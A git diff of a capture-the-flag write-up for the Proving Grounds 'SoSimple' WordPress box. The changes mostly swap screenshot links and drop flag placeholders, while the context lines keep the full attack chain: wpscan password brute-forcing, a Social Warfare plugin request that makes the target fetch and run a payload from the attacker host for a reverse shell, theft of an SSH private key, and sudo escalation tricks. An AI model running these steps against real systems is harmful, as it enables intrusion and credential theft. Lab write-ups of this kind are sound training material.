@@ -1,4 +1,4 @@
-# 🧩 SoSimple — Proving Grounds Practice Writeup
+# 🧩 SoSimple — Proving Grounds Play Writeup
 
 > **Platform:** Offensive Security Proving Grounds Practice
 > **Difficulty:** Intermediate
@@ -52,7 +52,8 @@ SoSimple is an intermediate Linux box built around a WordPress installation. Dir
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.109.78
 ```
 
-![Nmap Scan Results](screenshots/01_nmap_scan.png)
+<img width="1684" height="520" alt="image" src="https://github.com/user-attachments/assets/87af4b31-e9b4-427e-9e98-22c72197aeab" />
+
 
 ### Results
 
@@ -74,7 +75,8 @@ gobuster dir -u http://192.168.109.78 \
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40
 ```
 
-![Gobuster WordPress Discovery](screenshots/02_gobuster.png)
+<img width="1134" height="401" alt="image" src="https://github.com/user-attachments/assets/775f0301-f0ac-4830-a9b5-b8f9e5356679" />
+
 
 > **💡 Finding:** The `/wordpress/` directory confirms a WordPress installation — the next step is WordPress-specific enumeration with `wpscan`.
 
@@ -88,7 +90,8 @@ gobuster dir -u http://192.168.109.78 \
 wpscan --url http://192.168.109.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt
 ```
 
-![wpscan Enumeration](screenshots/03_wpscan.png)
+<img width="946" height="246" alt="image" src="https://github.com/user-attachments/assets/3581bb1a-1322-4f21-90e7-da0debe6c08c" />
+
 
 **Results:**
 - Valid user **`max`** identified
@@ -137,7 +140,8 @@ Trigger the plugin to fetch and execute it:
 http://192.168.109.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.166/payload.txt
 ```
 
-![Social Warfare /etc/passwd Leak](screenshots/04_cve_passwd.png)
+<img width="797" height="580" alt="image" src="https://github.com/user-attachments/assets/85280fd8-0508-4a6b-8e03-3120aeeb3c47" />
+
 
 The response returns `/etc/passwd`, confirming code execution and revealing interactive users:
 
@@ -169,7 +173,8 @@ Re-trigger the plugin to fetch the updated payload:
 http://192.168.109.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.166/payload.txt
 ```
 
-![Reverse Shell Received](screenshots/05_revshell.png)
+<img width="738" height="146" alt="image" src="https://github.com/user-attachments/assets/170ccc0c-dfcf-4796-bbe6-df9f9abb975b" />
+
 
 ---
 
@@ -182,11 +187,8 @@ A reverse shell was received as the web user (`www-data`). The shell was stabili
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![Initial Shell & Local Flag](screenshots/06_local_txt.png)
+<img width="894" height="340" alt="image" src="https://github.com/user-attachments/assets/a02158de-5b9e-45b6-acf5-a5abaa6d31c8" />
 
-```
-local.txt: <paste value from your screenshot>
-```
 
 > **Note:** the `local.txt` value was not captured in the source notes — drop the exact string from your own screenshot here before publishing.
 
@@ -201,7 +203,8 @@ ls -la
 cat .ssh/id_rsa
 ```
 
-![Leaked SSH Private Key](screenshots/07_id_rsa.png)
+<img width="875" height="677" alt="image" src="https://github.com/user-attachments/assets/50d2a791-ce3e-40d2-869a-9cd32f4714d3" />
+
 
 The key was copied to the attacker machine, permissions tightened, and used to authenticate as **max** over SSH.
 
@@ -211,7 +214,8 @@ chmod 600 id_rsa1
 ssh max@192.168.109.78 -i id_rsa1
 ```
 
-![SSH as max](screenshots/08_ssh_max.png)
+<img width="736" height="618" alt="image" src="https://github.com/user-attachments/assets/380a528d-1ef0-465c-a496-8bbbdbc0c9dc" />
+
 
 > **🎯 Finding:** A private key left world-readable on the host allowed a clean, interactive login as `max` — a far more stable foothold than the `www-data` reverse shell.
 
@@ -231,7 +235,7 @@ The `service` binary has a known [GTFOBins](https://gtfobins.github.io/gtfobins/
 sudo -u steven /usr/sbin/service ../../bin/bash
 ```
 
-![max to steven via service](screenshots/09_service_steven.png)
+<img width="851" height="65" alt="image" src="https://github.com/user-attachments/assets/dd1ea7b8-2e44-44cf-b6bf-563f904dd833" />
 
 ```
 steven@so-simple:/$ id
@@ -256,7 +260,8 @@ echo "/bin/bash" > tools/server-health.sh
 chmod +x tools/server-health.sh
 ```
 
-![Creating the root-run script](screenshots/10_opt_tools.png)
+<img width="938" height="129" alt="image" src="https://github.com/user-attachments/assets/b21446f5-2d4f-4ebf-b3ff-531fd66bc35c" />
+
 
 Executing the script through `sudo` runs `/bin/bash` as root:
 
@@ -264,7 +269,8 @@ Executing the script through `sudo` runs `/bin/bash` as root:
 sudo /opt/tools/server-health.sh
 ```
 
-![Root Shell](screenshots/11_root_shell.png)
+<img width="938" height="129" alt="image" src="https://github.com/user-attachments/assets/6dda58a6-f500-43af-a32a-95743143fe0e" />
+
 
 ```
 root@so-simple:~# id
@@ -283,14 +289,8 @@ cd /root
 cat proof.txt
 ```
 
-![Proof Flag](screenshots/12_proof_txt.png)
+<img width="578" height="115" alt="image" src="https://github.com/user-attachments/assets/21548b25-b7a4-407b-9620-38f2e14e384b" />
 
-| Flag | Location | Value |
-|------|----------|-------|
-| **local.txt** | user home | *(paste from your screenshot)* |
-| **proof.txt** | `/root/proof.txt` | *(paste from your screenshot)* |
-
-> **Note:** both flag values were illegible/absent in the source OCR — fill them in from your own captures before publishing.
 
 ---
 
